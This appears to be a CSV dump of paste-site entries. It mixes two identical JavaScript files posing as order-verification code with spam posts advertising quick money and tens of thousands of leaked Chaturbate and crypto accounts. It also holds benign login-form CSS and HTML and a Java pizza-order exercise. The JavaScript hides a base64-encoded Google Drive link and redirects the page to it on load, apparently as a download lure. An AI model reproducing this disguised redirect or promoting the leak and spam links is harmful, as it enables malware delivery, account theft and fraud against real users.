id,title,username,language,date,content
Avn38KmK,Order.js,jm33,JavaScript,Tuesday 29th of April 2025 07:07:54 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/48682/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1qzMCJxK,EARN $900 INSTANTLY 2025⭐ GV,covertbelli,JavaScript,Tuesday 29th of April 2025 07:06:32 AM CDT," 
Pdf https://tinyurl.com/freshleaks

aQDgb7RRNT
"
gwS31VQQ,Chaturbate with Tokens,zebmekey,JavaScript,Tuesday 29th of April 2025 07:05:40 AM CDT,56460 Accounts Posted On https://t.me/leakzbyeminem
gYXvAc8W,Make $1000 15-MINUTES  (BEGINNER) YR,covertbelli,JavaScript,Tuesday 29th of April 2025 06:57:17 AM CDT," 
Pdf https://tinyurl.com/freshleaks

PrVMW83KfJ
"
xa1whfE2,Market.js,jm33,JavaScript,Tuesday 29th of April 2025 06:52:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26390/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hKrYAtEW,Crypto Accounts,zebmekey,JavaScript,Tuesday 29th of April 2025 06:50:17 AM CDT,50287 Accounts Posted On https://t.me/leakzbyeminem
TJC9twhJ,EARN $900 INSTANTLY 2025 95,covertbelli,JavaScript,Tuesday 29th of April 2025 06:48:02 AM CDT," 
Pdf https://tinyurl.com/freshleaks

SOYoyR0l3h
"
EzAnjZA0,login.css,horozov86,CSS,Tuesday 29th of April 2025 06:47:33 AM CDT,"html {
  height: 100%;
}
body {
  margin: 0;
  padding: 0;
  font-family: sans-serif;
  background: linear-gradient(#141e30, #243b55);
}

.login-box {
  position: absolute;
  top: 50%;
  left: 50%;
  width: 400px;
  padding: 40px;
  transform: translate(-50%, -50%);
  background: rgba(0, 0, 0, 0.5);
  box-sizing: border-box;
  box-shadow: 0 15px 25px rgba(0, 0, 0, 0.6);
  border-radius: 10px;
}

.login-box h2 {
  margin: 0 0 30px;
  padding: 0;
  color: #fff;
  text-align: center;
}

.login-box .user-box {
  position: relative;
}

.login-box .user-box input {
  width: 100%;
  padding: 10px 0;
  font-size: 16px;
  color: #fff;
  margin-bottom: 30px;
  border: none;
  border-bottom: 1px solid #fff;
  outline: none;
  background: transparent;
}

.login-box .user-box label {
  position: absolute;
  top: 0;
  left: 0;
  padding: 10px 0;
  font-size: 16px;
  color: #fff;
  pointer-events: none;
  transition: 0.5s;
}

.login-box .user-box input:focus ~ label,
.login-box .user-box input:valid ~ label {
  top: -20px;
  left: 0;
  color: #03e9f4;
  font-size: 12px;
}

/* СТИЛ ЗА BUTTON */
.login-button {
  position: relative;
  display: inline-block;
  padding: 10px 20px;
  color: #03e9f4;
  font-size: 16px;
  background: none;
  border: none;
  text-transform: uppercase;
  overflow: hidden;
  transition: 0.5s;
  margin-top: 40px;
  letter-spacing: 4px;
  cursor: pointer;
}
.login-button:hover {
  background: #03e9f4;
  color: #fff;
  border-radius: 5px;
  box-shadow: 0 0 5px #B3E5FC,
              0 0 25px #03e9f4,
              0 0 50px #03e9f4,
              0 0 100px #B3E5FC;
}
.login-button span {
  position: absolute;
  display: block;
}

.login-button span:nth-child(1) {
  top: 0;
  left: -100%;
  width: 100%;
  height: 2px;
  background: linear-gradient(90deg, transparent, #03e9f4);
  animation: btn-anim1 1s linear infinite;
}

@keyframes btn-anim1 {
  0% {
    left: -100%;
  }
  50%, 100% {
    left: 100%;
  }
}

.login-button span:nth-child(2) {
  top: -100%;
  right: 0;
  width: 2px;
  height: 100%;
  background: linear-gradient(180deg, transparent, #03e9f4);
  animation: btn-anim2 1s linear infinite;
  animation-delay: 0.25s;
}

@keyframes btn-anim2 {
  0% {
    top: -100%;
  }
  50%, 100% {
    top: 100%;
  }
}

.login-button span:nth-child(3) {
  bottom: 0;
  right: -100%;
  width: 100%;
  height: 2px;
  background: linear-gradient(270deg, transparent, #03e9f4);
  animation: btn-anim3 1s linear infinite;
  animation-delay: 0.5s;
}

@keyframes btn-anim3 {
  0% {
    right: -100%;
  }
  50%, 100% {
    right: 100%;
  }
}

.login-button span:nth-child(4) {
  bottom: -100%;
  left: 0;
  width: 2px;
  height: 100%;
  background: linear-gradient(360deg, transparent, #03e9f4);
  animation: btn-anim4 1s linear infinite;
  animation-delay: 0.75s;
}

@keyframes btn-anim4 {
  0% {
    bottom: -100%;
  }
  50%, 100% {
    bottom: 100%;
  }
}
"
LAwNMT42,login.html,horozov86,HTML 5,Tuesday 29th of April 2025 06:46:19 AM CDT,"<div class=""login-box"">
  <h2>𝐋𝐨𝐠𝐢𝐧</h2>
  <form method=""post"">
    {% csrf_token %}
    <div class=""user-box"">
      <input type=""text"" name=""username"" required="""">
      <label>Username</label>
    </div>
    <div class=""user-box"">
      <input type=""password"" name=""password"" required="""">
      <label>Password</label>
    </div>
    <button type=""submit"" class=""login-button"">
      <span></span>
      <span></span>
      <span></span>
      <span></span>
      Submit
    </button>
  </form>
</div>
"
Wyq6tJwj,[NP] Domino's Prilep,dzocesrce,Java,Tuesday 29th of April 2025 06:39:43 AM CDT,"class Pizza {
    String pizzaName;
    double price;

    public Pizza(String pizzaName, float price) {
        this.pizzaName = pizzaName;
        this.price = price;
    }

    public String getPizzaName() {
        return pizzaName;
    }

    public double getPrice() {
        return price;
    }
}

class PizzaApp {
    Map<String,User> users;
    Map<String,Pizza> pizzas;
    Map<String, Double> pizzasByRevenue;
    Map<String,Map<User,Integer>> mostOrderedByUser;

    public PizzaApp() {
        this.users = new LinkedHashMap<>();
        this.pizzas = new LinkedHashMap<>();
        this.pizzasByRevenue = new LinkedHashMap<>();
        this.mostOrderedByUser = new LinkedHashMap<>();
    }

    public void registerUser(String email, String name, String phone) throws UserAlreadyExistsException {
        if(users.containsKey(email)) {
            throw new UserAlreadyExistsException(email);
        }
        users.putIfAbsent(email,new User(email,name,phone));
    }

    public void makeOrder(String email, String pizzaName, float price) {
        pizzas.putIfAbsent(pizzaName,new Pizza(pizzaName,price));
        pizzasByRevenue.putIfAbsent(pizzaName,0.0);
        pizzasByRevenue.computeIfPresent(pizzaName,(k,v)->v+price);
        mostOrderedByUser.putIfAbsent(pizzaName,new HashMap<>());
        mostOrderedByUser.get(pizzaName).putIfAbsent(users.get(email),0);
        mostOrderedByUser.get(pizzaName).computeIfPresent(users.get(email),(k,v)->v=v+1);
    }

    public void printRevenueByPizza() {
        pizzasByRevenue.entrySet().stream().sorted(Comparator.comparing((Map.Entry<String, Double> entry) ->
                                entry.getValue(),Comparator.reverseOrder())
                        .thenComparing(entry->entry.getKey(),Comparator.naturalOrder()))
                .forEach(i-> System.out.println(String.format(""%s %.2f"",i.getKey(),i.getValue())));
    }

    public void printMostFrequentForPizza() {
        for(Map.Entry<String,Map<User,Integer>> mostOrderedByUser : mostOrderedByUser.entrySet()) {
            System.out.println(String.format(""Pizza: %s"",mostOrderedByUser.getKey()));
            int maxOrdersForPizza = mostOrderedByUser.getValue().values().stream().max(Comparator.naturalOrder()).orElse(0);
            mostOrderedByUser.getValue().entrySet().stream()
                    .sorted(Comparator.comparing((Map.Entry<User, Integer> entry) ->
                            entry.getKey().id,Comparator.reverseOrder()))
                    .filter(i->i.getValue()==maxOrdersForPizza)
                    .forEach(i-> System.out.println(String.format(""%d %s %d"",i.getKey().id,i.getKey().email,i.getValue())));
        }

    }
}

class User {
    String email;
    String name;
    String phone;
    int id;
    public static int ID_GENERATOR = 0;
    public User(String email, String name, String phone) {
        this.email = email;
        this.name = name;
        this.phone = phone;
        ID_GENERATOR++;
        this.id = ID_GENERATOR;
    }

    public String getEmail() {
        return email;
    }

    public String getName() {
        return name;
    }

    public String getPhone() {
        return phone;
    }

    public int getId() {
        return id;
    }

    @Override
    public String toString() {
        return ""User{"" +
                ""email='"" + email + '\'' +
                "", name='"" + name + '\'' +
                "", phone='"" + phone + '\'' +
                "", id="" + id +
                '}';
    }
}

public class PizzaAppTest {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);

        PizzaApp pizzaApp = new PizzaApp();
        while (sc.hasNextLine()) {


            String line = sc.nextLine();
            String[] parts = line.split(""\\s+"");

            String method = parts[0];

            if (method.equalsIgnoreCase(""registerUser"")) {
                String email = parts[1];
                String name = parts[2];
                String phone = parts[3];
                try {
                    pizzaApp.registerUser(email, name, phone);
                } catch (UserAlreadyExistsException e) {
                    System.out.println(e.getMessage());
                }
            } else if (method.equalsIgnoreCase(""makeOrder"")) {
                String email = parts[1];
                String pizzaName = parts[2];
                float price = Float.parseFloat(parts[3]);
                pizzaApp.makeOrder(email, pizzaName, price);
            } else if (method.equalsIgnoreCase(""printRevenueByPizza"")) {
                System.out.println(""Print revenue by pizza"");
                pizzaApp.printRevenueByPizza();
            } else {
                System.out.println(""Print most frequent user(s) by pizza"");
                pizzaApp.printMostFrequentForPizza();
            }

        }
    }
}

class UserAlreadyExistsException extends Exception {
    public UserAlreadyExistsException(String email) {
        super(String.format(""User with email %s already exists"", email));
    }
}
"
